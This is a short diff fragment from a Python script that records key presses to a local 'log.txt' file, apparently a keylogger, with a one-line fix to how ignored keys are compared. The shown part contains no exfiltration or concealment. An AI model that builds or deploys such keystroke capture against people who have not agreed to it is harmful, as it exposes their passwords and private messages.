@@ -41,7 +41,7 @@ def when_press_the_key(key):
                       'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']
 
     with open('log.txt', 'a', encoding='utf-8') as log_file:
-        if key not in keys_to_ignore:
+        if key.name not in keys_to_ignore:
             if key.name == 'enter':
                 log_file.write('\n')
             elif key.name == 'space':
